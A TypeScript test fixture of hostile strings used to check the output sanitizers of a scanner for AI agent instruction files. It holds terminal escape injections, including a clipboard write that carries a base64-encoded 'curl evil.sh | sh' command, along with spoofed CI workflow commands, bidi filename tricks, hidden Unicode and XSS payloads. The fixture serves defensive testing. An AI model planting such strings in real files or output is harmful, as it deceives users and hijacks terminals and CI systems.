/**
 * Hostile strings: what a malicious repository can put into paths, excerpts and frontmatter.
 * Every sanitizer is tested against all of them, and the hostile ScanResult puts them in every
 * untrusted field.
 */
import type { ScanResult } from '../../src/core/engine.js';
import { at, finding, makeResult, RULES, rule } from './fixtures.js';

export const HOSTILE = {
  osc52Clipboard: 'copy\u001b]52;c;Y3VybCBldmlsLnNoIHwgc2g=\u0007done',
  clearScreen: '\u001b[2J\u001b[Hcleared',
  osc8Link: '\u001b]8;;https://evil.example\u001b\\click\u001b]8;;\u001b\\',
  c1Csi: 'eight-bit \u009b31mCSI\u009b0m and NEL\u0085',
  carriageReturn: 'safe text\rFAKE: all checks passed',
  stopCommands: 'line one\n::stop-commands::x',
  fakeError: 'line one\r\n::error::fake annotation',
  addMask: 'x\n::add-mask::secret\n::set-output name=a::b',
  bidiOverride: 'invoice\u202Etxt.exe and \u202Aembed\u202C \u200E\u200F\u061C',
  bidiIsolates: '\u2066isolated\u2069 \u2067rtl\u2069 \u2068fs\u2069',
  zeroWidth: 'zero\u200Bwidth\u200Cnon\u200Djoiner\u2060word\uFEFFbom',
  tags: 'tags\u{E0001}\u{E0049}\u{E0067}\u{E006E}\u{E007F}end',
  variationSelectors: 'plain\uFE0F text\uFE0E and smuggled 😀\uFE0F\uFE0F\u{E0100}\u{E0101}',
  loneSurrogates: 'lone \uD800 high and \uDC00 low',
  nulAndDel: 'nul\u0000del\u007fbell\u0007bs\u0008',
  lineSeparators: 'ls\u2028ps\u2029',
  mentions: 'ping @octocat and @github/security-team, mail me@example.com',
  issueRefs: 'closes #1, GH-2 and owner/repo#3',
  html: '<img src=x onerror=alert(1)> <script>alert(1)</script> &lt;b&gt;',
  links: '[click](javascript:alert(1)) ![x](https://evil.example/p.png) <https://evil.example>',
  autolinks: 'https://evil.example www.evil.example javascript:alert(1)',
  tablePipes: 'a | b || c \\| d',
  markdownSyntax: '# heading *em* **strong** `code` ~~del~~ $x$ > quote - item 1. item',
  percentEscapes: '100% done %0A %25 a:b,c=d',
  sarifLink: 'see [here](1) and \\[escaped\\] \\\\',
  emoji: 'emoji 👍\u{1F3FD} ❤\uFE0F 👨\u200D👩\u200D👧 1\uFE0F\u20E3',
  cjk: '设置文件过大',
  tab: 'tab\there',
} as const;

export type HostileName = keyof typeof HOSTILE;
export const HOSTILE_STRINGS: readonly string[] = Object.values(HOSTILE);
/** All of them in one string. */
export const HOSTILE_ALL = HOSTILE_STRINGS.join(' ');

const evilRule = rule('evil:rule,title=x', 'correctness', 'warn');

/** Hostile text in every untrusted field. */
export const hostileResult: ScanResult = makeResult({
  artifacts: [
    {
      path: 'evil\u001b]52;c;cHduZWQ=\u0007/CLAUDE.md',
      kind: 'claude-md',
      readers: ['claude-code'],
    },
    { path: 'notes\n::stop-commands::x/AGENTS.md', kind: 'agents-md', readers: ['codex'] },
    { path: 'docs/AGENTS\u202Edm.md', kind: 'agents-md', readers: ['codex'] },
  ],
  score: { score: 72, grade: 'C', capped: false },
  rules: [RULES.brokenImport, RULES.fileTooLarge, RULES.hiddenUnicode],
  findings: [
    finding(RULES.hiddenUnicode, 'docs/AGENTS\u202Edm.md', HOSTILE.bidiOverride, {
      range: at(1, 1, 1, 4),
      related: [{ path: 'a\u001b[31m|b', message: HOSTILE.osc8Link, range: at(2, 2) }],
    }),
    finding(
      RULES.brokenImport,
      'evil\u001b]52;c;cHduZWQ=\u0007/CLAUDE.md',
      HOSTILE.osc52Clipboard,
      {
        range: at(2, 1, 2, 10),
      },
    ),
    finding(RULES.brokenImport, 'evil\u001b]52;c;cHduZWQ=\u0007/CLAUDE.md', HOSTILE.stopCommands, {
      range: at(3, 1, 3, 10),
    }),
    finding(RULES.fileTooLarge, 'evil\u001b]52;c;cHduZWQ=\u0007/CLAUDE.md', HOSTILE.fakeError, {
      range: at(4, 1, 4, 10),
    }),
    finding(RULES.fileTooLarge, 'notes\n::stop-commands::x/AGENTS.md', HOSTILE.carriageReturn, {
      range: at(1, 1, 1, 2),
    }),
    finding(RULES.fileTooLarge, 'notes\n::stop-commands::x/AGENTS.md', HOSTILE.addMask, {
      range: at(2, 1, 2, 2),
    }),
    finding(RULES.fileTooLarge, 'notes\n::stop-commands::x/AGENTS.md', HOSTILE.mentions, {
      range: at(3, 1, 3, 2),
    }),
    finding(RULES.fileTooLarge, 'notes\n::stop-commands::x/AGENTS.md', HOSTILE.html, {
      range: at(4, 1, 4, 2),
    }),
    finding(RULES.fileTooLarge, 'notes\n::stop-commands::x/AGENTS.md', HOSTILE.links, {
      range: at(5, 1, 5, 2),
    }),
    finding(evilRule, 'notes\n::stop-commands::x/AGENTS.md', HOSTILE_ALL, {
      range: at(6, 1, 6, 2),
      guidance: HOSTILE_ALL,
      fix: {
        id: `${evilRule.id}#${HOSTILE.tags}`,
        class: 'review',
        title: HOSTILE_ALL,
        changes: [
          {
            kind: 'edit',
            path: 'notes\n::stop-commands::x/AGENTS.md',
            edits: [{ offset: 0, length: 1, text: HOSTILE_ALL }],
          },
          { kind: 'create', path: 'new\u001b[2J/CLAUDE.md', text: HOSTILE_ALL },
          { kind: 'rename', from: 'link\u202E.md', to: '.cursor/rules/link\u202E.mdc' },
        ],
        notes: [HOSTILE.osc8Link, HOSTILE.stopCommands],
        warning: HOSTILE.addMask,
        alternatives: [
          {
            id: `${evilRule.id}#${HOSTILE.bidiOverride}`,
            class: 'safe',
            title: HOSTILE.clearScreen,
            changes: [
              { kind: 'encoding', path: 'docs/AGENTS\u202Edm.md', to: 'utf-8', bom: false },
            ],
          },
        ],
      },
    }),
    finding(RULES.fileTooLarge, 'notes\n::stop-commands::x/AGENTS.md', HOSTILE.tablePipes, {
      range: at(7, 1, 7, 2),
      suppressed: { kind: 'inline', reason: HOSTILE.clearScreen },
    }),
  ],
  skipped: [{ path: 'big\u001b[2J.md', reason: 'too-large' }],
  unresolvedSymlinks: [
    { path: 'link\u202E.md', target: '../\u001b]0;pwned\u0007', problem: 'outside-root' },
  ],
  ruleFailures: [{ ruleId: 'risk/crashy', message: 'boom\n::error::fake\u001b[2J' }],
  configWarnings: [`Unknown rule "${HOSTILE.osc52Clipboard}" in configuration.`],
});
